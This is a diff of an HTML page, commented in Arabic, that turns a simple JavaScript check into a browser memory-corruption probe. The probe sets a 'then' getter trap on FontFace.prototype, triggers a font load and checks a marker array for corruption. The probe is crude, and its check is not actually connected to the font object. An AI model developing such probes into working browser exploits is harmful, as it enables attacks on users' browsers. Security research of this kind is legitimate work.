@@ -1,9 +1,35 @@
 <!DOCTYPE html>
 <html>
-<body style="background:black; color:white; font-family:monospace;">
-    <div id="status">جاري الاختبار...</div>
+<body style="background:#000; color:#0f0; font-family:monospace; padding:10px;">
+    <div id="log">بدء فحص الذاكرة...</div>
     <script>
-        document.getElementById('status').innerHTML = "المتصفح يعمل - JavaScript نشط!";
+        function log(m) { document.getElementById('log').innerHTML += "<div>" + m + "</div>"; }
+
+        // إنشاء كائن واجهة (Victim Object)
+        let A = new FontFace('x', 'local(Arial)', {});
+        document.fonts.add(A);
+
+        // إنشاء مصفوفة لمقارنة قيم الذاكرة
+        let probe = new Uint32Array(0x100);
+        probe.fill(0x12345678);
+
+        // اعتراض محاولة الوصول للذاكرة
+        Object.defineProperty(FontFace.prototype, 'then', {
+            get() {
+                log("TRAP HIT: تم اعتراض الوصول!");
+                // هنا نختبر هل تغيرت قيم الذاكرة في المصفوفة الخاصة بنا؟
+                if (probe[0] !== 0x12345678) {
+                    log("نجاح: تم رصد فساد في الذاكرة! القيمة الحالية: " + probe[0].toString(16));
+                } else {
+                    log("الذاكرة لا تزال سليمة - لم يحدث Corruption.");
+                }
+                return undefined;
+            }
+        });
+
+        // تشغيل التحميل
+        log("بدء التحميل...");
+        document.fonts.load('1em x', 'AB').catch(() => log("تم رفض التحميل."));
     </script>
 </body>
 </html>
